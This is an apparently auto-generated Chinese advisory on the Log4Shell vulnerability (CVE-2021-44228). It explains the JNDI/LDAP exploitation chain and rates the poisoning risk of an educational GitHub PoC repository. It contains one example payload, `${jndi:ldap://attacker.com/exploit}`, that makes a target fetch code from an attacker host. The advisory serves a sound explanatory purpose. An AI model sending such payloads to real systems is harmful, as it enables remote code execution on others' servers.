## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且启用了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行任意代码。漏洞利用方式如下：

1.  **攻击者发送恶意请求：** 攻击者向目标系统发送一个包含特定格式的字符串（例如 `${jndi:ldap://attacker.com/exploit}`）的请求，这个字符串会被 Log4j2 记录。
2.  **Log4j2 解析恶意字符串：** 当 Log4j2 尝试记录包含`${jndi:...}`的字符串时，它会触发 JNDI lookup。
3.  **JNDI 发起 LDAP 查询：** JNDI 会根据 URL (例如 `ldap://attacker.com/exploit`) 发起 LDAP 查询请求攻击者控制的 LDAP 服务器。
4.  **LDAP 服务器返回恶意引用：** 攻击者的 LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **Log4j2 加载并执行恶意代码：** Log4j2 尝试从指定的 URL 加载并实例化这个 Java 类，从而执行攻击者提供的任意代码。

**有效性：**

根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，并且存在公开可用的 PoC。提供的漏洞利用代码库是一个用于演示 Log4Shell 漏洞的教育项目，因此其有效性是为了演示漏洞而设计的。

**投毒风险：**

评估此代码库的投毒风险较低，约为 10%。

*   代码库的 `README.md` 文件明确声明其目的是为了教育和演示 Log4Shell 漏洞，并警告用户不要在生产环境中使用。
*   代码库结构清晰，主要包含一个易受攻击的 Spring Boot 应用程序 (`vulnerable-app`)，一个模拟恶意 LDAP 服务器的 `marshalsec` fork，和一个提供恶意 Java 类的 HTTP 服务器 (`payload-server`)。
*   虽然存在通过修改 `Exploit.class` 文件来植入恶意代码的可能性，但这种投毒行为相对容易被发现，因为其主要目的是演示漏洞，所以更可能是测试后门连接，并非投毒代码。
*   代码贡献者 Fabio Eletto 已经明确声明了代码的用途，降低了恶意使用的可能性。

但是，用户仍然需要谨慎使用此代码库，务必在隔离的环境中进行测试，并仔细审查代码以确保安全。

**项目地址:** [fabioeletto/hka-seminar-log4shell](https://github.com/fabioeletto/hka-seminar-log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)